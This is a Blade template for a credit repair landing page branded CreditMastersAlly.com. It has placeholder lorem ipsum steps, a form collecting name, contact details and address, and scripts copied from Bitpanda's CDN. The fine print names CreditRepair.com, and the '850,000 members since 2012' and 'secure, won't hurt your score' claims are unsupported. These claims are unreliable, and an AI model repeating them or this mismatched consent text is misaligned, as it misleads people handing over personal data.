@include('layouts.partials.header')

    <section id=layout-content tabindex=-1>
        <section class="default uk-padding-remove-bottom uk-section">
            <div class=uk-container>
                <div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid="">
                    
                    <div class=default>
                        <section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m">
                            <div class=module-text__content>
                                <h1 class="md:text-[60px] text-[42px] font-[600]">Better Credit Score <br>Better Secured Future</h1>
                            </div>
                            <div class="js-bp3-cta-button module-text__buttons"><span class=primary-button><a class="desktop-button tk-get-started-button uk-button uk-button-large uk-button-primary" href="register"> Get Started </a> <a class="mobile-button tk-get-app-button uk-button uk-button-large uk-button-primary" href="register"> Get Started </a></span> </div>
                            <script>
                                window.initScriptLater = function(scriptUrl, fallback) {
                                    const script = document.createElement("script");
                                    script.onload = fallback;
                                    script.src = scriptUrl;

                                    document.addEventListener("readystatechange", () => {
                                        if (document.readyState === "interactive") {
                                            document.head.appendChild(script);
                                        }
                                    });
                                };

                                window.initScriptLater("/resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                                    window.initCtaButton()
                                );

                            </script>
                        </section>
                    </div>
                    <div class=default>
                        <div class=bp3-hero-ticker__image-container><img alt="Hero ticker" src="/resources/1/img/Hero.png"> </div>
                            </div>
                        </div>
                        <script>
                            window.initScriptLater = function(scriptUrl, fallback) {
                                const script = document.createElement("script");
                                script.onload = fallback;
                                script.src = scriptUrl;

                                document.addEventListener("readystatechange", () => {
                                    if (document.readyState === "interactive") {
                                        document.head.appendChild(script);
                                    }
                                });
                            };

                            window.initScriptLater("/resources/cdn.bitpanda.com/app/v2/js/hero-ticker.minda91.js?id=08a6562cc452f266d797", () =>
                                window.initHeroTicker("1,85,28", ".js-bp3-hero-ticker-1685902989")
                            );

                        </script>
                        
                        <div class="module-steps__footer uk-text-left">
                            <div class="js-bp3-cta-button module-text__buttons"></div>
                            <script>
                                window.initScriptLater = function(scriptUrl, fallback) {
                                    const script = document.createElement("script");
                                    script.onload = fallback;
                                    script.src = scriptUrl;

                                    document.addEventListener("readystatechange", () => {
                                        if (document.readyState === "interactive") {
                                            document.head.appendChild(script);
                                        }
                                    });
                                };

                                window.initScriptLater("/resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                                    window.initCtaButton()
                                );

                            </script>
                        </div>
                    </div>
                </section>
            </div>
        </section>
        <hr class=uk-margin-remove>

        <div class="w-full lg:w-[50%] mx-auto my-10 flex flex-col items-center px-6 py-2">
            <div class="w-full text-center">
                <h2 class="font-bold text-2xl md:text-4xl text-sky-700">
                    What is credit repair?
                </h2>
                <div class="my-10">
                    <p class="text-xl font-[400]">
                        Credit repair is the process of identifying and addressing any unfair, inaccurate or unverified negative items hurting your credit, including 
                        <b class="font-black">collections, late payments, charge-offs</b> and more.
                    </p>
                </div>
            </div>

            <script>
                let activeSlide = 1
                
                function switchActiveSlide(index){
                    $('.active-slide').addClass('hidden-slide')
                    $('.active-slide-indicator').addClass('hidden-slide-indicator')
                    $('.active-slide').removeClass('active-slide')
                    $('.active-slide-indicator').removeClass('active-slide-indicator')

                    $(`.slide-${index}`).removeClass('hidden-slide')
                    $(`.slide-indicator-${index}`).removeClass('hidden-slide-indicator')
                    $(`.slide-${index}`).addClass('active-slide')
                    $(`.slide-indicator-${index}`).addClass('active-slide-indicator')
                }

                function nextSlide(){
                    
                    $('.slide-1').removeClass('active-slide')
                    $('.slide-1').addClass('hidden-slide')

                    $('.slide-2').removeClass('hidden-slide')
                    $('.slide-2').addClass('active-slide')
                    
                }

                function prevSlide(){
                    
                    $('.slide-2').removeClass('active-slide')
                    $('.slide-2').addClass('hidden-slide')

                    $('.slide-1').removeClass('hidden-slide')
                    $('.slide-1').addClass('active-slide')
                    
                }
                
            </script>

            <style>
                .hidden-slide{
                    opacity: 0;
                    transform: translateX(200%);
                }

                .active-slide{
                    opacity: 1;
                    transform: translateX(0);
                    animation-name: pull-slide;
                    animation-duration: .6s;
                    animation-iteration-count: 1;
                    
                }

                @keyframes pull-slide{
                    from{
                        opacity: 0;
                        transform: translateX(200%);
                    }
                    to{
                        opacity: 1;
                        transform: translateX(0%);
                    }
                }

                .active-slide-indicator{
                    background: rgb(2, 118, 157);
                    border: 2px solid rgb(2, 115, 152);
                }

                .hidden-slide-indicator{
                    background: transparent;
                    border: 2px solid rgb(1, 57, 76);
                }
            </style>
            
            <div class="w-full border-[1.5pt] border-sky-700 rounded-lg" id="slidesdom">
                {{-- slides --}}
                <div class="full px-7 py-5">
                    <div class="w-full mb-8">
                        <h4 class="text-2xl font-bold text-sky-700 text-center">
                            Here's how we do it
                        </h4>
                    </div>

                    <div class="w-full flex justify-between space-y-5 md:space-x-5 md:space-y-0 items-center flex-col md:flex-row">

                        <div class="slide-indicators flex justify-center items-center flex-row md:flex-col md:space-y-2 md:space-x-0 space-x-2">
                            <div onclick="prevSlide()" class="cursor-pointer text-xs italic text-sky-700 font-bold">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left-circle-fill" viewBox="0 0 16 16">
                                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0m3.5 7.5a.5.5 0 0 1 0 1H5.707l2.147 2.146a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 1 1 .708.708L5.707 7.5z"/>
                                  </svg>
                            </div>
                            
                            <div onclick="switchActiveSlide(1)" class="active-slide-indicator slide-indicator-1 cursor-pointer md:h-6 md:w-3 h-3 w-6 rounded-full "></div>
                            <div onclick="switchActiveSlide(2)" class="slide-indicator-2 cursor-pointer md:h-6 md:w-3 h-3 w-6 rounded-full bg-transparent border-sky-700 border-2"></div>
                            <div onclick="switchActiveSlide(3)" class="slide-indicator-3 cursor-pointer md:h-6 md:w-3 h-3 w-6 rounded-full bg-transparent border-sky-700 border-2"></div>

                            <div onclick="nextSlide()" class="cursor-pointer text-xs italic text-sky-700 font-bold">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-right-circle-fill" viewBox="0 0 16 16">
                                    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0M4.5 7.5a.5.5 0 0 0 0 1h5.793l-2.147 2.146a.5.5 0 0 0 .708.708l3-3a.5.5 0 0 0 0-.708l-3-3a.5.5 0 1 0-.708.708L10.293 7.5z"/>
                                  </svg>
                            </div>
                        </div>
    
                        <div class="relative w-full h-full min-h-[400pt] md:min-h-[200pt] overflow-hidden">
                            <div class="p-2 w-full min-h-[400pt] md:min-h-[200pt] absolute z-auto active-slide slide-1">
                                <div class="flex flex-col md:flex-row justify-between items-center w-full">
                                    <div class="px-5 py-5">
                                        <div class="rounded-full text-4xl font-bold text-sky-700 border-sky-700 border-[2pt] h-[50pt] w-[50pt] flex justify-center items-center">
                                            1
                                        </div>
                                    </div>
                
                                    <div class="w-full flex flex-col space-y-4 text-center md:text-left">
                                        <h1 class="text-2xl md:text-3xl font-bold text-sky-700">
                                            Step One:
                                        </h1>
                                        <p class="text-md md:text-lg pr-3">
                                            Lorem ipsum dolor sit amet consectetur adipisicing elit. Magni placeat nulla maxime ullam id expedita sed aperiam omnis, similique impedit sunt doloribus laborum iure dolorem iste? Hic tempore dicta odit?
                                        </p>
                                    </div>
                                </div>
                            </div>


                            <div class="p-2 w-full min-h-[400pt] md:min-h-[200pt]  absolute z-0 hidden-slide slide-2">
                                <div class="flex flex-col md:flex-row justify-between items-center w-full">
                                    <div class="px-5 py-5">
                                        <div class="rounded-full text-4xl font-bold text-sky-700 border-sky-700 border-[2pt] h-[50pt] w-[50pt] flex justify-center items-center">
                                            2
                                        </div>
                                    </div>
                
                                    <div class="w-full flex flex-col space-y-4 text-center md:text-left">
                                        <h1 class="text-2xl md:text-3xl font-bold text-sky-700">
                                            Step Two:
                                        </h1>
                                        <p class="text-md md:text-lg pr-3">
                                            Lorem ipsum dolor sit amet consectetur adipisicing elit. Magni placeat nulla maxime ullam id expedita sed aperiam omnis, similique impedit sunt doloribus laborum iure dolorem iste? Hic tempore dicta odit?
                                        </p>
                                    </div>
                                </div>
                            </div>

                            <div class="p-2 w-full min-h-[400pt] md:min-h-[200pt] absolute z-0 hidden-slide slide-3">
                                <div class="flex flex-col md:flex-row justify-between items-center w-full">
                                    <div class="px-5 py-5">
                                        <div class="rounded-full text-4xl font-bold text-sky-700 border-sky-700 border-[2pt] h-[50pt] w-[50pt] flex justify-center items-center">
                                            3
                                        </div>
                                    </div>
                
                                    <div class="w-full flex flex-col space-y-4 text-center md:text-left">
                                        <h1 class="text-2xl md:text-3xl font-bold text-sky-700">
                                            Step Three:
                                        </h1>
                                        <p class="text-md md:text-lg pr-3">
                                            Lorem ipsum dolor sit amet consectetur adipisicing elit. Magni placeat nulla maxime ullam id expedita sed aperiam omnis, similique impedit sunt doloribus laborum iure dolorem iste? Hic tempore dicta odit?
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                    </div>
                    
                </div>
            </div>
        </div>

        <div class="w-full bg-sky-700 text-white py-[50pt] px-5">
            <div class="md:w-[70%] mx-auto md:py-[100pt]">
                <div>
                    <h3 class="text-4xl font-bold text-center text-white">
                        Ready to start your credit journey?
                    </h3>
                </div>
    
                <div class="flex justify-between flex-col md:flex-row w-full items-center mt-10">
                    <div class="flex flex-col space-y-3 items-center py-10 w-full">
                        <p class="text-lg">
                            I've seen my credit, and something isn't right
                        </p>
                        <div class="px-6">
                            <button class="bg-orange-500 text-white px-4 md:px-8 py-3.5 text-sm font-[450]">
                                Get credit help
                            </button>
                        </div>
                    </div>
    
                    <div class="flex flex-col space-y-3 items-center py-10 border-t-2 border-t-sky-300 md:border-t-0 md:border-l-2 md:border-l-sky-300 w-full">
                        <p class="text-lg">
                            I'm not sure what's on my credit
                        </p>
                        <div class="px-6">
                            <button class="bg-orange-500 text-white px-4 md:px-8 py-3.5 text-sm font-[450]">
                                Get a FREE Credit Snapshot
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
    </section>


    <div class="w-full px-5 md:px-[30%] py-[20pt] flex flex-col justify-center items-center">
        {{-- free credit valuation request --}}

        <div class="w-full text-center">
            <h2 class="font-[450] text-2xl md:text-4xl text-sky-600 my-4">
                Get your FREE online credit evaluation now
            </h2>
            <div class="text-left px-2 md:px-[30pt] text-2xl flex flex-col space-y-3 md:w-[70%] mx-auto my-4">
                <div>
                    <b class="font-[450]">FREE</b> credit score
                </div>
                <div>
                    <b class="font-[450]">FREE</b> negative Item Summary
                </div>
                <div>
                    <b class="font-[450]">FREE</b> recommended Credit Solution
                </div>
            </div>
        </div>

        <div class="text-center w-full">
            <h2 class="font-[450] text-2xl md:text-4xl text-sky-600 my-4">First, we need some info to pull your credit</h2>
            <p>
                Don't worry &mdash; this is secure and won't hurt your score
            </p>
            <p>
                And did we mention it's FREE?
            </p>
        </div>

        <div class="flex flex-col justify-center items-center w-full">

            <form>
                <div class="w-full flex py-3 justify-between flex-col md:flex-row space-y-3 md:space-y-0 md:space-x-3">
                    <div class="w-full md:w-1/2">
                        <input type="text" name="fName" placeholder="First Name" class="w-full p-4 bg-gray-50">
                    </div>

                    <div class="w-full md:w-1/2">
                        <input type="text" name="lName" placeholder="Last Name" class="w-full p-4 bg-gray-50">
                    </div>
                </div>

                <div class="w-full flex py-3 justify-between flex-col md:flex-row space-y-3 md:space-y-0 md:space-x-3">
                    <div class="w-full md:w-1/2">
                        <input type="email" name="email" placeholder="Email Address" class="w-full p-4 bg-gray-50">
                    </div>

                    <div class="w-full md:w-1/2">
                        <input type="tel" name="tel" placeholder="Phone Number" class="w-full p-4 bg-gray-50">
                    </div>
                </div>

                <div class="w-full flex py-3 justify-between flex-col md:flex-row space-y-3 md:space-y-0 md:space-x-3">
                    <div class="w-full md:w-1/2">
                        <input type="text" name="street" placeholder="Street Address" class="w-full p-4 bg-gray-50">
                    </div>

                    <div class="w-full md:w-1/2">
                        <input type="text" name="zip" placeholder="Zip Code" class="w-full p-4 bg-gray-50">
                    </div>
                </div>

                <div class="w-full flex justify-center items-center my-5">
                    <button type="submit" class="bg-orange-500 px-12 py-3 hover:bg-accent-100/0 border-2 border-orange-500 text-white hover:text-orange-600 transition">
                        Submit
                    </button>
                </div>

                <div>
                    <p class="text-xs text-gray-800 text-justify">
                        By clicking 'Submit' I agree by electronic signature to: (1) be contacted by CreditRepair.com about credit repair or credit repair marketing by a live agent, artificial or prerecorded voice, and SMS text at my residential or cellular number, dialed manually or by autodialer even if my phone number is on a do-not-call registry (consent to be contacted is not a condition to purchase services); and (2) the Privacy Policy and Terms of Use (including this arbitration Provision ).
                    </p>
                </div>
            </form>
        </div>

        
    </div>
    

    <div class="w-full flex flex-col md:flex-row bg-sky-700 text-blue-50 my-4 items-center">

        <div class="w-full md:w-1/2 min-h-full">
          <img src="https://www.creditrepair.com/content/dam/credit-repair/common/assets/imgs/Mask-Group-63.jpg" alt="mm" class="h-[100%] min-h-[400pt] w-full bg-gray-300">
        </div>
        <div class=" w-full md:w-1/2 flex justify-center items-center px-3 py-5 md:py-[100pt]">
          {{-- text-block --}}

            <div class="flex space-y-4 flex-col text-center md:text-left items-center justify-center md:items-start md:justify-start">
                <div class="flex flex-col md:space-y-2">
                    <div class="text-xl md:text-3xl font-bold">
                        CreditMastersAlly.com
                    </div>
                    <div class="text-xl md:text-3xl font-bold">
                        has worked with over
                    </div>
                </div>
                <p class="text-4xl md:text-5xl font-bold pt-10 pb-7 leading-relaxed">
                    <span class="font-bold text-[50pt] md:text-[55pt]">850,000</span> 
                    members
                </p>
                <p class="text-xl font-bold md:text-3xl">
                    with their credit since 2012
                </p>
            </div>
        </div>
        
    </div>
@include('layouts.partials.footer')